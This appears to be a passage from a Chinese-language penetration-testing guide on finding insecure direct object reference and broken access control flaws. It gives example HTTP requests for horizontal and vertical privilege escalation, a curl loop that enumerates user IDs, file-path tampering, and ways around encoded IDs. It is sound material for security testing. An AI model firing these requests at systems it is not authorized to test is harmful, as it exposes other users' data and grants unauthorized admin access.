## 二、检测方法

### 2.1 参数识别
```
1. 拦截所有请求，标记包含对象ID的参数
2. 常见ID参数名：id, uid, user_id, account_id, order_id, file_id, doc_id,
   report_id, message_id, ticket_id, customer_id, product_id, invoice_id,
   payment_id, transaction_id, profile_id, photo_id, comment_id, post_id,
   flow_id, thread_id, workspace_id, tenant_id, org_id
3. 记录两个不同用户A和B的相同操作请求
4. 替换A请求中的对象ID为B的ID，重放
5. 用burp param miner自动发现隐藏ID参数
```

### 2.2 水平越权测试
```http
# 用户A访问自己的订单（正常）
GET /api/orders/1001 HTTP/1.1
Cookie: session=user_a_session

# 替换为用户B的订单ID
GET /api/orders/1002 HTTP/1.1     （应403/404）
Cookie: session=user_a_session

# POST修改数据
POST /api/orders/1002/cancel HTTP/1.1
Cookie: session=user_a_session

# JSON API
POST /api/user/profile HTTP/1.1
Cookie: session=user_a_session
{"user_id": 2, "email": "<EMAIL-REDACTED>"}
```

### 2.3 垂直越权测试
```http
# 普通用户访问管理员接口
GET /admin/users HTTP/1.1          （应403）
Cookie: session=normal_user

GET /api/admin/delete_user?id=1 HTTP/1.1
Cookie: session=normal_user

# 普通用户尝试提权
POST /api/user/update HTTP/1.1
Cookie: session=normal_user
{"role":"admin","is_admin":true}

# 仅前端隐藏但后端不校验
POST /api/users/create HTTP/1.1    （管理员功能，普通用户直连）
Cookie: session=normal_user
{"username":"hacker","password":"x","role":"superadmin"}
```

### 2.4 ID枚举测试
```
# 自增ID遍历
for i in {1..1000}; do curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/user/$i"; done

# 检测响应差异（状态码/长度/内容）
# 200+内容→ID存在；403→存在但无权限；404→不存在；302→需认证
# 注意：很多IDOR表现为"内容不同但都返回200"，必须对比body
# 高级：用 jq 提取关键字段hash对比，而非只看状态码
curl -s "https://target.com/api/user/1001" | jq -r '.email'   # 对比邮箱唯一性
```

### 2.5 静态文件越权
```
/files/avatar/user_123.jpg    → user_456.jpg
/download?file=report_a.pdf   → report_b.pdf
/export/invoice_1001.pdf      → 改invoice ID
/storage/photos/2024/01/abc.jpg  → 路径遍历枚举
/files?path=/user1/data.csv   → path篡改
# 云存储URL：bucket.oss-cn-hangzhou.aliyuncs.com/user123/file.jpg
# 签名URL：验证是否绑定用户、过期时间、CDN缓存键
```

### 2.6 编码/加密ID绕过
```php
// Base64编码ID
?id=MTIz → 解码=123 → 改124 → MTI0

// JWT中的ID → jwt_tool测试（见5.5）

// Hashids（可逆哈希）
// 尝试默认salt/弱salt → 解码ID → 修改 → 重编码
// hashids算法公开，salt可猜测

// 序列化对象中的ID字段，反序列化修改

// 十六进制/八进制/十进制变体
?user_id=0x7B   → 123
?user_id=0173   → 123
```

